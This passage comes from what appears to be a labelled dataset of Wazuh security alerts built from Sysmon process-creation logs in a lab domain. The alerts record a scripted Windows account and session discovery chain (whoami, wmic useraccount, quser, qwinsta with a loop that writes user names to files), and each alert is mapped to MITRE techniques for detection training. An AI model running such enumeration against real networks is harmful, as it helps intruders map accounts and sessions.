SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=D5AE0D13127AE8A7F872F5F3A835D6E217C44A86,MD5=76739CA32A2D852E9953BFC5AD0FDC08,SHA256=9C439179991319D1C6BE5ECD50C01738F9DE6B5EE9E8702FEE612E725C086F9F,IMPHASH=43C6BE584D77B658A53A9A5C606724DD\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:35.3343827Z", "eventRecordID": "395372", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 5, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720556.2050586", "timestamp": "2025-07-05T13:02:36.234+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:36.234Z"]}, "sort": [1751720556234]}}
{"id": "uqmu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "uqmu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "quser.exe", "image": "C:\\\\Windows\\\\System32\\\\quser.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Query User Utility", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-9401-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "2460", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.390", "hashes": "SHA1=CF02B7AF671E65DA963D6421458C3771B6914420,MD5=7BBF2B163FFB89A9E3F232FC8D61EAAB,SHA256=AEC93DC8483FDBFE2A537AB26FB4D07DC628BE2AA67C4E02381B086E7C830DEE,IMPHASH=B72F14292FAC033099AD1A08D6867486", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1033,technique_name=System Owner/User Discovery", "company": "Microsoft Corporation", "commandLine": "quser  /SERVER:\\\"localhost\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.1882 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1033,technique_name=System Owner/User Discovery\r\nUtcTime: 2025-07-05 13:02:57.390\r\nProcessGuid: {ff3427f9-2281-6869-9401-000000001500}\r\nProcessId: 2460\r\nImage: C:\\Windows\\System32\\quser.exe\r\nFileVersion: 10.0.26100.1882 (WinBuild.160101.0800)\r\nDescription: Query User Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: quser.exe\r\nCommandLine: quser  /SERVER:\"localhost\" \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=CF02B7AF671E65DA963D6421458C3771B6914420,MD5=7BBF2B163FFB89A9E3F232FC8D61EAAB,SHA256=AEC93DC8483FDBFE2A537AB26FB4D07DC628BE2AA67C4E02381B086E7C830DEE,IMPHASH=B72F14292FAC033099AD1A08D6867486\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.3970703Z", "eventRecordID": "395388", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 6, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2070379", "timestamp": "2025-07-05T13:02:58.684+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.684Z"]}, "sort": [1751720578684]}}
{"id": "u6mu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "u6mu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "quser.exe", "image": "C:\\\\Windows\\\\System32\\\\quser.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Query User Utility", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-9501-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "7572", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.482", "hashes": "SHA1=CF02B7AF671E65DA963D6421458C3771B6914420,MD5=7BBF2B163FFB89A9E3F232FC8D61EAAB,SHA256=AEC93DC8483FDBFE2A537AB26FB4D07DC628BE2AA67C4E02381B086E7C830DEE,IMPHASH=B72F14292FAC033099AD1A08D6867486", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1033,technique_name=System Owner/User Discovery", "company": "Microsoft Corporation", "commandLine": "quser", "integrityLevel": "High", "fileVersion": "10.0.26100.1882 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1033,technique_name=System Owner/User Discovery\r\nUtcTime: 2025-07-05 13:02:57.482\r\nProcessGuid: {ff3427f9-2281-6869-9501-000000001500}\r\nProcessId: 7572\r\nImage: C:\\Windows\\System32\\quser.exe\r\nFileVersion: 10.0.26100.1882 (WinBuild.160101.0800)\r\nDescription: Query User Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: quser.exe\r\nCommandLine: quser  \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=CF02B7AF671E65DA963D6421458C3771B6914420,MD5=7BBF2B163FFB89A9E3F232FC8D61EAAB,SHA256=AEC93DC8483FDBFE2A537AB26FB4D07DC628BE2AA67C4E02381B086E7C830DEE,IMPHASH=B72F14292FAC033099AD1A08D6867486\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.4876300Z", "eventRecordID": "395390", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 7, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2078251", "timestamp": "2025-07-05T13:02:58.689+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.689Z"]}, "sort": [1751720578689]}}
{"id": "vKmu2pcBGfDWR0X_074N", "description": "Gathered user information from Remote Desktop Service sessions", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "vKmu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "qwinsta.exe", "image": "C:\\\\Windows\\\\System32\\\\qwinsta.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Query Session Utility", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-9601-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "8500", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.525", "hashes": "SHA1=E0BA6714F7CD0AA89665CE1190E3EAE72538CA97,MD5=3E40037F447723F686D1D0640D2CD8CA,SHA256=25B58392DFC39233BB2CFDB8D2109D7BE6C99ADBAEE0E0232A636E1DBF08175E,IMPHASH=D1DB32AE474C00FB7315E2D610E6A740", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "qwinsta.exe  /server:localhost", "integrityLevel": "High", "fileVersion": "10.0.26100.1882 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.525\r\nProcessGuid: {ff3427f9-2281-6869-9601-000000001500}\r\nProcessId: 8500\r\nImage: C:\\Windows\\System32\\qwinsta.exe\r\nFileVersion: 10.0.26100.1882 (WinBuild.160101.0800)\r\nDescription: Query Session Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: qwinsta.exe\r\nCommandLine: qwinsta.exe  /server:localhost \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=E0BA6714F7CD0AA89665CE1190E3EAE72538CA97,MD5=3E40037F447723F686D1D0640D2CD8CA,SHA256=25B58392DFC39233BB2CFDB8D2109D7BE6C99ADBAEE0E0232A636E1DBF08175E,IMPHASH=D1DB32AE474C00FB7315E2D610E6A740\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.5312381Z", "eventRecordID": "395392", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Gathered user information from Remote Desktop Service sessions", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["System Owner/User Discovery"], "id": ["T1033"], "tactic": ["Discovery"]}, "id": "92022"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2086031", "timestamp": "2025-07-05T13:02:58.694+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.694Z"]}, "sort": [1751720578694]}}
{"id": "v6mu2pcBGfDWR0X_074N", "description": "Gathered user information from Remote Desktop Service sessions", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "v6mu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "qwinsta.exe", "image": "C:\\\\Windows\\\\System32\\\\qwinsta.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2281-6869-9801-000000001500}", "description": "Query Session Utility", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "C:\\\\WINDOWS\\\\system32\\\\cmd.exe /c qwinsta /server:localhost | findstr \\\"Active Disc\\\"", "processGuid": "{ff3427f9-2281-6869-9901-000000001500}", "logonId": "0x82f6f", "parentProcessId": "2484", "processId": "2876", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.652", "hashes": "SHA1=E0BA6714F7CD0AA89665CE1190E3EAE72538CA97,MD5=3E40037F447723F686D1D0640D2CD8CA,SHA256=25B58392DFC39233BB2CFDB8D2109D7BE6C99ADBAEE0E0232A636E1DBF08175E,IMPHASH=D1DB32AE474C00FB7315E2D610E6A740", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "qwinsta  /server:localhost", "integrityLevel": "High", "fileVersion": "10.0.26100.1882 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.652\r\nProcessGuid: {ff3427f9-2281-6869-9901-000000001500}\r\nProcessId: 2876\r\nImage: C:\\Windows\\System32\\qwinsta.exe\r\nFileVersion: 10.0.26100.1882 (WinBuild.160101.0800)\r\nDescription: Query Session Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: qwinsta.exe\r\nCommandLine: qwinsta  /server:localhost \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=E0BA6714F7CD0AA89665CE1190E3EAE72538CA97,MD5=3E40037F447723F686D1D0640D2CD8CA,SHA256=25B58392DFC39233BB2CFDB8D2109D7BE6C99ADBAEE0E0232A636E1DBF08175E,IMPHASH=D1DB32AE474C00FB7315E2D610E6A740\r\nParentProcessGuid: {ff3427f9-2281-6869-9801-000000001500}\r\nParentProcessId: 2484\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\WINDOWS\\system32\\cmd.exe /c qwinsta /server:localhost | findstr \"Active Disc\"\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.6563507Z", "eventRecordID": "395398", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Gathered user information from Remote Desktop Service sessions", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["System Owner/User Discovery"], "id": ["T1033"], "tactic": ["Discovery"]}, "id": "92022"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2109846", "timestamp": "2025-07-05T13:02:58.707+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.707Z"]}, "sort": [1751720578707]}}
{"id": "wKmu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "wKmu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "FINDSTR.EXE", "image": "C:\\\\Windows\\\\System32\\\\findstr.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2281-6869-9801-000000001500}", "description": "Find String (QGREP) Utility", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "C:\\\\WINDOWS\\\\system32\\\\cmd.exe /c qwinsta /server:localhost | findstr \\\"Active Disc\\\"", "processGuid": "{ff3427f9-2281-6869-9a01-000000001500}", "logonId": "0x82f6f", "parentProcessId": "2484", "processId": "7812", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.663", "hashes": "SHA1=14188B880D4410EAF7168FB629FD6FB59BEA3DAC,MD5=E43DE137E75349CACF2760ABFC338340,SHA256=46BDB9125C43BD3F63C233A7B0D021B04E867C4D19B72DDBCF6E5F2A392014D3,IMPHASH=FAF6C2ABBD03B51B5852A294EAAFC7CE", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "findstr  \\\"Active Disc\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.1150 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.663\r\nProcessGuid: {ff3427f9-2281-6869-9a01-000000001500}\r\nProcessId: 7812\r\nImage: C:\\Windows\\System32\\findstr.exe\r\nFileVersion: 10.0.26100.1150 (WinBuild.160101.0800)\r\nDescription: Find String (QGREP) Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: FINDSTR.EXE\r\nCommandLine: findstr  \"Active Disc\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=14188B880D4410EAF7168FB629FD6FB59BEA3DAC,MD5=E43DE137E75349CACF2760ABFC338340,SHA256=46BDB9125C43BD3F63C233A7B0D021B04E867C4D19B72DDBCF6E5F2A392014D3,IMPHASH=FAF6C2ABBD03B51B5852A294EAAFC7CE\r\nParentProcessGuid: {ff3427f9-2281-6869-9801-000000001500}\r\nParentProcessId: 2484\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\WINDOWS\\system32\\cmd.exe /c qwinsta /server:localhost | findstr \"Active Disc\"\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.6724891Z", "eventRecordID": "395399", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 10, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2116001", "timestamp": "2025-07-05T13:02:58.711+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.711Z"]}, "sort": [1751720578711]}}
{"id": "wamu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "wamu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-9b01-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "1264", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.729", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "C:\\\\WINDOWS\\\\system32\\\\cmd.exe  /S /D /c\\\" echo services \\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.729\r\nProcessGuid: {ff3427f9-2281-6869-9b01-000000001500}\r\nProcessId: 1264\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\WINDOWS\\system32\\cmd.exe  /S /D /c\" echo services \"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: 